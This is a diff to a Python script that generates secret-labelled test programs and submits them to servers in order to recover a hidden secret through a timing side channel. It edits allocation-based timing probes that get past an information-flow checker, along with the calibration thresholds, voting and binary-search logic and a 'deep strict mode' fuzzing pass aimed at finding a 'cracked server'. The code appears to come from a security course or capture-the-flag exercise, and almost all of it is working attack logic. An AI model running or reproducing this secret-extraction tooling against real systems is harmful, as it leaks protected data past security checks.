@@ -1078,14 +1078,12 @@ def make_short_circuit_timing_program(*, term_count: int) -> str:
 """
 
 
-def make_array_alloc_timing_program(*, scale: int, mod_base: int) -> str:
-    # Attempt a checker-bypass timing channel where both branches are expression-only,
-    # but runtime work differs due to alloc_array size. No explicit loops/assignments.
+def make_array_alloc_timing_program(*, alloc_size: int) -> str:
+    # Secret-gated allocation timing probe: heavy allocation is only evaluated on the
+    # true path of the short-circuit expression.
     return f"""int main(int input, int secret) {{
   //@label H;
-  int[] A = alloc_array(int, (((input % {mod_base}) + {mod_base}) % {mod_base} + 1) * ({scale}));
-  //@label H;
-  bool burn = (secret < input) && (\\length(A) >= 0);
+  bool burn = (secret < input) && (\\length(alloc_array(int, {alloc_size})) >= 0);
   return 0;
 }}
 """
@@ -1100,23 +1098,10 @@ def recover_from_timing_oracle(
     debug: bool,
     verify_timeout_s: float,
 ) -> int:
-    def timing_input_for(mid: int, candidate_name: str) -> int:
-        if candidate_name.startswith("alloc-timing-"):
-            # Avoid huge allocation sizes during boundary/binary-search probes, while
-            # preserving monotonic ordering of attacker inputs.
-            max_safe_input = 1 << 20
-            if mid <= SECRET_MIN:
-                return 0
-            if mid >= SECRET_MAX_EXCLUSIVE:
-                return max_safe_input
-            mapped = (mid * max_safe_input) // SECRET_MAX_EXCLUSIVE
-            return max(1, mapped)
-        return mid
-
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
-    alloc_timing_candidates = [(2000, 1021), (4000, 1021), (8000, 509)]
+    alloc_timing_candidates = [500_000, 1_000_000, 2_000_000]
     min_ratio = 1.03
     min_gap_s = 0.0020
     min_boundary_consistency = 0.80
@@ -1136,11 +1121,11 @@ def recover_from_timing_oracle(
                 make_short_circuit_timing_program(term_count=term_count),
             )
         )
-    for scale, mod_base in alloc_timing_candidates:
+    for alloc_size in alloc_timing_candidates:
         candidates.append(
             (
-                f"alloc-timing-scale={scale}-mod={mod_base}",
-                make_array_alloc_timing_program(scale=scale, mod_base=mod_base),
+                f"alloc-timing-size={alloc_size}",
+                make_array_alloc_timing_program(alloc_size=alloc_size),
             )
         )
 
@@ -1155,7 +1140,7 @@ def recover_from_timing_oracle(
                     server_command=server_command,
                     userid=userid,
                     program_path=path,
-                    input_value=timing_input_for(SECRET_MIN, candidate_name),
+                    input_value=SECRET_MIN,
                     timeout_s=timeout_s,
                     repeats=calibration_repeats,
                 )
@@ -1163,7 +1148,7 @@ def recover_from_timing_oracle(
                     server_command=server_command,
                     userid=userid,
                     program_path=path,
-                    input_value=timing_input_for(SECRET_MAX_EXCLUSIVE, candidate_name),
+                    input_value=SECRET_MAX_EXCLUSIVE,
                     timeout_s=timeout_s,
                     repeats=calibration_repeats,
                 )
@@ -1193,16 +1178,10 @@ def recover_from_timing_oracle(
             # Dynamic cost control: some candidates (especially allocation-based ones)
             # can become very expensive during boundary voting / binary search.
             classify_repeats = max(2, min(3, repeats))
-            votes_total = 2
-            boundary_checks = 5
-            if ratio >= 1.12 and gap >= 0.010:
-                classify_repeats = 1
-                votes_total = 1
-                boundary_checks = 3
-            elif ratio >= 1.08 and gap >= 0.005:
-                classify_repeats = max(1, repeats // 2)
-                votes_total = 1
-                boundary_checks = 3
+            votes_total = 3
+            boundary_checks = 7
+            if ratio >= 1.15 and gap >= 0.015:
+                boundary_checks = 5
             debug_log(
                 debug,
                 f"[timing] {candidate_name}: classify-repeats={classify_repeats} "
@@ -1210,14 +1189,13 @@ def recover_from_timing_oracle(
             )
 
             def classify(mid: int) -> bool:
-                mapped_mid = timing_input_for(mid, candidate_name)
                 votes_true = 0
                 for _ in range(votes_total):
                     t_mid = median_runtime_for_input(
                         server_command=server_command,
                         userid=userid,
                         program_path=path,
-                        input_value=mapped_mid,
+                        input_value=mid,
                         timeout_s=timeout_s,
                         repeats=classify_repeats,
                     )
@@ -1238,105 +1216,6 @@ def recover_from_timing_oracle(
 
             boundary_lo, conf_lo = boundary_vote(SECRET_MIN, boundary_checks)
             boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE, boundary_checks)
-
-            if (
-                candidate_name.startswith("alloc-timing-")
-                and ratio >= 1.12
-                and gap >= 0.010
-                and (
-                conf_lo < min_boundary_consistency
-                or conf_hi < min_boundary_consistency
-                or boundary_lo == boundary_hi
-                )
-            ):
-                # Fallback for noisy alloc-timing probes: scan for a stable local
-                # sign change in mapped input space, then classify against that.
-                max_safe_input = 1 << 20
-                grid = [0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512]
-                grid += [1024, 2048, 4096, 8192, 16384, 32768]
-                grid += [65536, 131072, 262144, 524288, 786432, max_safe_input]
-
-                point_truth: dict[int, bool] = {}
-                point_conf: dict[int, float] = {}
-                for x in grid:
-                    val, conf = boundary_vote(x, 3)
-                    point_truth[x] = val
-                    point_conf[x] = conf
-
-                bracket: Optional[tuple[int, int]] = None
-                for left, right in zip(grid, grid[1:]):
-                    if (
-                        point_truth[left] != point_truth[right]
-                        and point_conf[left] >= min_boundary_consistency
-                        and point_conf[right] >= min_boundary_consistency
-                    ):
-                        bracket = (left, right)
-                        break
-
-                if bracket is not None:
-                    left, right = bracket
-                    left_val = point_truth[left]
-                    right_val = point_truth[right]
-                    debug_log(
-                        debug,
-                        f"[timing] {candidate_name}: local bracket [{left}, {right}] "
-                        f"({left_val}->{right_val})",
-                    )
-
-                    def mapped_classify(mapped_input: int) -> bool:
-                        mapped_input = max(0, min(max_safe_input, mapped_input))
-                        votes_true = 0
-                        for _ in range(votes_total):
-                            t_mid = median_runtime_for_input(
-                                server_command=server_command,
-                                userid=userid,
-                                program_path=path,
-                                input_value=mapped_input,
-                                timeout_s=timeout_s,
-                                repeats=classify_repeats,
-                            )
-                            if t_mid > threshold:
-                                votes_true += 1
-                        return votes_true * 2 >= votes_total
-
-                    def mapped_to_secret_guess(mapped_input: int) -> int:
-                        return (mapped_input * SECRET_MAX_EXCLUSIVE) // max_safe_input
-
-                    # Binary search in mapped space first.
-                    lo_m = left
-                    hi_m = right
-                    while lo_m + 1 < hi_m:
-                        mid_m = (lo_m + hi_m) // 2
-                        if mapped_classify(mid_m) == right_val:
-                            hi_m = mid_m
-                        else:
-                            lo_m = mid_m
-                    candidate = mapped_to_secret_guess(lo_m)
-
-                    verify_passes = 0
-                    verified_value: Optional[int] = None
-                    for _ in range(5):
-                        verified = verify_nearby_candidates(
-                            server_command=server_command,
-                            userid=userid,
-                            candidate=candidate,
-                            timeout_s=verify_timeout_s,
-                        )
-                        if verified is not None:
-                            verify_passes += 1
-                            verified_value = verified
-                    if verify_passes >= 3 and verified_value is not None:
-                        if verified_value != candidate:
-                            debug_log(
-                                debug,
-                                f"[timing] adjusted candidate {candidate} -> {verified_value}",
-                            )
-                        return verified_value
-                    debug_log(
-                        debug,
-                        f"[timing] {candidate_name}: local-bracket candidate failed verification "
-                        f"({verify_passes}/5)",
-                    )
 
             if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
                 last_failure = (
@@ -1735,8 +1614,8 @@ def recover_server_secret(
                 userid=userid,
                 timeout_s=tuned_query_timeout,
                 debug=debug,
-                max_probes=220 if deep else 24,
-                early_break_enabled=not deep,
+                max_probes=24,
+                early_break_enabled=True,
             ),
         ),
         (
@@ -1763,6 +1642,11 @@ def recover_server_secret(
     # Deep mode: spend more effort on strict-policy servers where most probes
     # are rejected as insecure, to increase chances of finding one cracked server.
     if strict_policy_mode and deep:
+        # In deep mode we replace the short strict-fuzz pass with a single larger one
+        # to avoid duplicate work while still exploring broadly.
+        strict_mode_strategies = [
+            pair for pair in strict_mode_strategies if pair[0] != "strict expr fuzz suite"
+        ]
         strict_mode_strategies.insert(
             1,
             (
@@ -1779,7 +1663,7 @@ def recover_server_secret(
         )
         debug_log(
             debug,
-            f"[serve{server_idx}] deep strict mode enabled (timing-repeats={timing_repeats})",
+            f"[serve{server_idx}] deep strict mode enabled (--deep)",
         )
     strategies = strict_mode_strategies if strict_policy_mode else full_strategies
 
